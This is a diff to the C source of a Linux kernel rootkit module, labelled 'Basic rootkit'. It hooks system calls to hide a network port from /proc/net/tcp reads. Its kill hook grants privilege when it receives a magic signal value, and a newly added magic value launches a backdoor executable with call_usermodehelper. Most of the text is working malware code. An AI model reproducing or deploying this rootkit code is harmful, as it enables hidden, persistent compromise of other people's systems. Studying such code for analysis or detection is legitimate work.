@@ -33,7 +33,7 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define FILE_BASENAME_SIZE  4
 #define BACKDOOR_PATH       "/home/antoine/Perso/rootkit/backdoor"
 #define MAGIC_AUTH_PID      1234
-#define MAGIC_OPEN_SOCK     4321
+#define MAGIC_BACKDOOR      1235
 #define MAX_PIDS            8
 #define MIN(a,b)            ((a < b) ? a : b)
 #define MAX_LINE_LEN        512
@@ -54,8 +54,8 @@ struct vip_files vip_filenames[] = {
 const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);
 
 static char* hidden_port[] = {
-    "0100007F:0462",	// 127.0.0.1:1122
-    "00000000:0462"		// 127.0.0.1:1122
+    "0100007F:0462",    // 127.0.0.1:1122
+    "00000000:0462"     // 0.0.0.0:1122
 };
 
 const size_t hidden_port_size = sizeof(hidden_port_size) / sizeof(hidden_port[0]);
@@ -243,36 +243,6 @@ static char * extract_line(const char * buf, char * line, size_t count)
     return (tok + 1);
 }
 
-// Extract local addr from /proc/net/tcp file
-static int extract_local_addr(char * line, char * addr, int is_ipv6)
-{
-    int     addr_size           = 8;
-    int     port_size           = 4;
-    char *  p                   = NULL;
-    char *  tok                 = NULL;
-    char    buf[MAX_LINE_LEN]   = {0};
-
-    if(!line || !addr)
-        return -1;
-    else if(strlen(line) < 3)
-        return -1;
-
-    if(is_ipv6)
-        addr_size = 32;
-
-    snprintf(buf, MAX_LINE_LEN, "%s", line);
-    p = buf;
-
-    tok = strsep(&p, ":");
-    if(!p)
-        return -1;
-
-    memcpy(addr, p + 1, addr_size + port_size + 1);
-    memcpy(addr + addr_size + port_size + 1, "\0", 1);
-
-    return 0;
-}
-
 struct file *file_open(const char *path, int flags, int rights)
 {
     struct file *filp = NULL;
@@ -367,11 +337,11 @@ asmlinkage int fake_sys_open(const char *pathname, int flags)
 asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 {
     int     i = 0, j = 0, skip = 0;
-    ssize_t ret     = 0;
+    ssize_t read     = 0;
     char *  p       = (char *)buf;
     char    line[MAX_LINE_LEN] = {0};
     char *  tmp     = kmalloc(count, GFP_KERNEL);
-    size_t  offset  = 0;
+    ssize_t  offset  = 0;
     pid_t   pid     = original_sys_getpid();
     pid_t   ppid    = original_sys_getppid();
 
@@ -381,11 +351,11 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
         if(vip_filenames[i].fd == fd)
             break;
 
-    ret = original_sys_read(fd, buf, count);
+    read = original_sys_read(fd, buf, count);
 
     // Not a vip file, read in normally
     if(i == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
-        return ret;
+        goto clean_exit;
 
     //lets just print tmp for now
     while((p = extract_line(p, line, MAX_LINE_LEN)) != NULL)
@@ -401,6 +371,7 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
         if(skip)
         {
             skip = 0;
+            read -= strlen(line) + 1;
             continue;
         }
 
@@ -411,13 +382,17 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
     }
 
     // Zero padding at the end of the buffer
-    memset(tmp + offset, '\0', count - offset);
+    memset(tmp + offset, '\0', 1);
     memcpy(buf, tmp, count);
     kfree(tmp);
 
     vip_filenames[i].fd = -1;
 
-    return ret;
+    return read;
+
+clean_exit:
+    kfree(tmp);
+    return read;
 }
 
 asmlinkage int fake_sys_kill(pid_t pid, int sig)
@@ -433,13 +408,13 @@ asmlinkage int fake_sys_kill(pid_t pid, int sig)
             printk("[%s] Received auth key...\n", __this_module.name);
             if(authorized_pids_cnt < MAX_PIDS)
                 authorized_pids[authorized_pids_cnt++] = current->pid;
-
+            break;
+        case MAGIC_BACKDOOR:
             printk("[%s] Start process backdoor\n", __this_module.name);
             ret = call_usermodehelper(BACKDOOR_PATH, argv, envp, UMH_WAIT_EXEC);
             //~ ret = original_sys_execve(filename, argv, envp);
             printk("[%s] Finish process backdoor %d\n", __this_module.name, ret);
-
-        break;
+            break;
         default:
             ret = original_sys_kill(pid, sig);
     }
